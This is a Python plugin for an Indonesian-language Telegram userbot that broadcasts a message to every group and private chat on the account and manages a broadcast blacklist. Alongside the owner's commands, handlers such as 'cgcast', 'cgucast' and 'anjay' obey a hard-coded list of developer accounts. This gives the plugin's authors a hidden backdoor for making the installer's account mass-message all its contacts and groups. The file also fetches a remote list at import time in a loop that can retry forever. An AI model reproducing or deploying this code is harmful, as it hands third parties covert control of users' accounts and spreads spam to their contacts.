import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get
from config import BLACKLIST_GCAST
from config import PREFIX as cmd
from Ah.bantuan.adminHelpers import DEVS
from Ah.bantuan.basic import edit_or_reply
from Ah.bantuan.tools import get_arg
from Ah.utils.misc import restart

from .help import add_command_help

# Mendapatkan daftar blacklist GCAST dari GitHub
while 0 < 6:
    _GCAST_BLACKLIST = get(
        "https://raw.githubusercontent.com/iamuput/eizy/UputtNande/blacklistgcast.json"
    )
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [-1001608701614, -1001473548283, -1001982790377, -1001812143750, -1001692751821, -1001390552926, -1001001675459127, -1001864253073, -1001001951726069]
    GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
    break

del _GCAST_BLACKLIST


@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gcast", cmd) & filters.me)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await message.reply("`Mengirim pesan ke semua grup, tunggu sebentar...`")
    else:
        return await message.reply("**Pesannya mana?**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**Berhasil mengirim pesan ke** `{done}` **grup, gagal mengirim ke** `{error}` **grup.**"
    )


@Client.on_message(filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gucast", cmd) & filters.me)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await message.reply("`Mengirim pesan ke semua chat pribadi, tunggu sebentar...`")
    else:
        return await message.reply("**Pesannya mana?**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**Berhasil mengirim pesan ke** `{done}` **chat pribadi, gagal mengirim ke** `{error}` **chat.**"
    )


@Client.on_message(filters.command("blchat", cmd) & filters.me)
async def blchatgcast(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    list = BLACKLIST_GCAST.replace(" ", "\n» ")
    if blacklistgc == "True":
        await message.reply(
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Grup:**\n» {list}\n\nKetik `{cmd}addblacklist` di grup yang ingin anda tambahkan ke daftar blacklist gcast."
        )
    else:
        await message.reply("🔮 **Blacklist GCAST:** `Disabled`")


@Client.on_message(filters.command("addblacklist", cmd) & filters.me)
async def addblacklist(client: Client, message: Message):
    anu = await message.reply("`Memproses...`")
    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await anu.edit(
        f"**Berhasil menambahkan** `{message.chat.id}` **ke daftar blacklist GCAST.**\n\nSilakan restart untuk menerapkan perubahan."
    )
    # Update blacklist di file .env
    path = dotenv.find_dotenv(".env")
    dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)


@Client.on_message(filters.command("delblacklist", cmd) & filters.me)
async def delblacklist(client: Client, message: Message):
    bqngsat = await message.reply("`Memproses...`")
    gett = str(message.chat.id)
    if gett in BLACKLIST_GCAST:
        blacklistgrup = BLACKLIST_GCAST.replace(gett, "")
        await bqngsat.edit(
            f"**Berhasil menghapus** `{message.chat.id}` **dari daftar blacklist GCAST.**\n\nSilakan restart untuk menerapkan perubahan."
        )
        # Update blacklist di file .env
        path = dotenv.find_dotenv(".env")
        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
    else:
        await message.reply("**Grup ini tidak ada dalam daftar blacklist GCAST.**")


@Client.on_message(filters.user(DEVS) & filters.command("anjay", ""))
async def tes(Client, Message):
    try:
        await Client.send_reaction(Message.chat.id, Message.id, "❤")
    except Exception as e:
        return await Message.reply(f"Error: {str(e)}")


add_command_help(
    "broadcast",
    [
        [
            "gcast <text/reply>",
            "Mengirim Global Broadcast pesan ke seluruh grup yang kamu masuk. (Bisa mengirim media/sticker)",
        ],
        [
            "gucast <text/reply>",
            "Mengirim Global Broadcast pesan ke seluruh chat pribadi yang ada. (Bisa mengirim media/sticker)",
        ],
        [
            "blchat",
            "Untuk mengecek informasi daftar blacklist GCAST.",
        ],
        [
            "addblacklist",
            "Untuk menambahkan grup tersebut ke blacklist GCAST.",
        ],
        [
            "delblacklist",
            f"Untuk menghapus grup tersebut dari blacklist GCAST.\n\nKetik perintah `{cmd}addblacklist` dan `{cmd}delblacklist` di grup yang ingin di blacklist atau dihapus dari blacklist.",
        ],
    ],
)
